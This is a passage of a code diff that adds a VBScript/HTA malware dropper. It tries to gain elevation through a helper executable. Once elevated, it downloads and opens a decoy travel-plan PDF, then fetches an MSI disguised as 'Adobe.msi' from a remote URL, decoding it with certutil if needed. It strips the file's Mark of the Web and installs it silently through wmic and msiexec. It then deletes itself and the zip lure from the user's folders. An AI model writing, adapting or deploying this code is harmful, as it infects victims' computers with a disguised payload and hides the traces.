+            batContent = "@echo off" & vbCrLf & "start """" /min mshta.exe """ & selfPath & """" & vbCrLf
+
+            On Error Resume Next
+            Set bf = fso.CreateTextFile(batPath, True)
+            bf.Write batContent
+            bf.Close
+            Err.Clear
+            On Error GoTo 0
+
+            If fso.FileExists(batPath) Then
+                On Error Resume Next
+                shortBat = fso.GetFile(batPath).ShortPath
+                If Err.Number <> 0 Then shortBat = batPath
+                Err.Clear
+                On Error GoTo 0
+                dbg.WriteLine "[BAT] short path: " & shortBat
+
+                dbg.WriteLine "[ICU] running: " & qs & tmpExe & qs & " m4a1_dev4 " & qs & shortBat & qs
+                sh.Run qs & tmpExe & qs & " m4a1_dev4 " & qs & shortBat & qs, 0, False
+                sh.Run "%COMSPEC% /c timeout /t 20 /nobreak >nul & del /f /q """ & batPath & """", 0, False
+            End If
+        End If
+    End If
+    dbg.WriteLine "=== END (unelevated) ==="
+    dbg.Close
+
+' ============================================================
+'  ADMIN
+' ============================================================
+Else
+    dbg.WriteLine "[BRANCH] ADMIN - proceeding with payload"
+    tmpExe = sh.ExpandEnvironmentStrings("%TEMP%") & "\icu.exe"
+    On Error Resume Next
+    If fso.FileExists(tmpExe) Then fso.DeleteFile tmpExe, True
+    If fso.FileExists(sh.ExpandEnvironmentStrings("%TEMP%") & "\r.bat") Then fso.DeleteFile sh.ExpandEnvironmentStrings("%TEMP%") & "\r.bat", True
+    Err.Clear
+    On Error GoTo 0
+
+    ' --- PDF ---
+    dbg.WriteLine "[PDF] starting"
+    pdfPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Travel-Meeting-Plan-Q4-2026.pdf"
+    On Error Resume Next
+    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
+    http.Open "GET", pdfUrl, False
+    http.Send
+    Err.Clear
+    On Error GoTo 0
+    dbg.WriteLine "[PDF] status: " & http.Status
+
+    If http.Status = 200 Then
+        Dim pdfSaved
+        pdfSaved = False
+
+        On Error Resume Next
+        Set stream = CreateObject("ADODB.Stream")
+        stream.Type = 1
+        stream.Open
+        stream.Write http.ResponseBody
+        stream.SaveToFile pdfPath, 2
+        Err.Clear
+        stream.Close
+        On Error GoTo 0
+
+        If fso.FileExists(pdfPath) Then
+            pdfSaved = True
+        Else
+            dbg.WriteLine "[PDF] direct save FAILED - VBS fallback"
+            Dim pXml, pNode
+            On Error Resume Next
+            Set pXml = CreateObject("MSXML2.DOMDocument")
+            Set pNode = pXml.createElement("b")
+            pNode.dataType = "bin:base64"
+            pNode.nodeTypedValue = http.ResponseBody
+            Set stream = CreateObject("ADODB.Stream")
+            stream.Type = 1
+            stream.Open
+            stream.Write pNode.nodeTypedValue
+            stream.SaveToFile pdfPath, 2
+            stream.Close
+            Err.Clear
+            On Error GoTo 0
+            If fso.FileExists(pdfPath) Then pdfSaved = True
+        End If
+
+        If pdfSaved Then
+            dbg.WriteLine "[PDF] saved & opened"
+            sh.Run "msedge.exe """ & pdfPath & """", 1, False
+        End If
+    End If
+
+    ' --- MSI ---
+    dbg.WriteLine "[MSI] starting"
+    msiPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\Adobe.msi"
+    On Error Resume Next
+    If fso.FileExists(msiPath) Then fso.DeleteFile msiPath, True
+    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
+    http.Open "GET", msiUrl, False
+    http.Send
+    Err.Clear
+    On Error GoTo 0
+    dbg.WriteLine "[MSI] status: " & http.Status
+
+    If http.Status = 200 Then
+        Dim msiSaved
+        msiSaved = False
+
+        On Error Resume Next
+        Set stream = CreateObject("ADODB.Stream")
+        stream.Type = 1
+        stream.Open
+        stream.Write http.ResponseBody
+        stream.SaveToFile msiPath, 2
+        If Err.Number <> 0 Then dbg.WriteLine "[MSI] direct save err: " & Err.Number
+        Err.Clear
+        stream.Close
+        On Error GoTo 0
+
+        If fso.FileExists(msiPath) Then
+            msiSaved = True
+            dbg.WriteLine "[MSI] saved: " & fso.GetFile(msiPath).Size & " bytes"
+        Else
+            dbg.WriteLine "[MSI] direct save FAILED - certutil fallback"
+            Dim mXml, mNode, b64Text, fh, b64Path
+            b64Path = sh.ExpandEnvironmentStrings("%TEMP%") & "\Adobe.b64"
+            
+            On Error Resume Next
+            Set mXml = CreateObject("MSXML2.DOMDocument")
+            Set mNode = mXml.createElement("b")
+            mNode.dataType = "bin:base64"
+            mNode.nodeTypedValue = http.ResponseBody
+            b64Text = mNode.text
+            Err.Clear
+            On Error GoTo 0
+            
+            If b64Text <> "" Then
+                Set fh = fso.CreateTextFile(b64Path, True)
+                fh.Write b64Text
+                fh.Close
+                dbg.WriteLine "[MSI] wrote b64 file, size: " & Len(b64Text)
+                
+                ' Use certutil to decode the file on disk
+                dbg.WriteLine "[MSI] running certutil decode..."
+                sh.Run "%COMSPEC% /c certutil.exe -decode """ & b64Path & """ """ & msiPath & """", 0, True
+                
+                If fso.FileExists(msiPath) Then 
+                    msiSaved = True
+                    dbg.WriteLine "[MSI] certutil saved: " & fso.GetFile(msiPath).Size & " bytes"
+                Else
+                    dbg.WriteLine "[MSI] certutil FAILED to decode"
+                End If
+                
+                On Error Resume Next
+                fso.DeleteFile b64Path, True
+                Err.Clear
+                On Error GoTo 0
+            Else
+                dbg.WriteLine "[MSI] b64 conversion failed"
+            End If
+        End If
+
+        If msiSaved Then
+            ' 1. Strip the Mark of the Web
+            On Error Resume Next
+            Dim adsFile
+            adsFile = msiPath & ":Zone.Identifier"
+            If fso.FileExists(adsFile) Then 
+                fso.DeleteFile adsFile, True
+                dbg.WriteLine "[MSI] Zone.Identifier stripped"
+            End If
+            Err.Clear
+            On Error GoTo 0
+
+            ' 2. Launch via WMIC (Clean syntax)
+            Dim wmicCmd
+            wmicCmd = "wmic process call create " & qs & "msiexec.exe /i """ & msiPath & """ /qn /norestart" & qs
+            dbg.WriteLine "[MSI] wmic cmd: " & wmicCmd
+            sh.Run "%COMSPEC% /c " & wmicCmd, 0, False
+            
+            ' 3. Cleanup
+            sh.Run "%COMSPEC% /c timeout /t 90 /nobreak >nul & del /f /q """ & msiPath & """", 0, False
+        End If
+    End If
+
+    ' --- CLEANUP ---
+    dbg.WriteLine "[CLEANUP] Spawning deferred deletes"
+    sh.Run "%COMSPEC% /c timeout /t 60 /nobreak >nul & del /f /q " & qs & selfPath & qs, 0, False
+
+    Dim cleanZip
+    cleanZip = "timeout /t 60 /nobreak >nul & " & _
+               "wmic process call create " & qs & "cmd.exe /c for %d in (%USERPROFILE%\Downloads %USERPROFILE%\Desktop %USERPROFILE%\Documents %USERPROFILE%) do @if exist """"%d\0-1Document.zip"""" del /f /q """"%d\0-1Document.zip""""" & qs
+    sh.Run "%COMSPEC% /c " & cleanZip, 0, False
+
+    dbg.WriteLine "=== END (elevated) ==="
+    dbg.Close
+End If
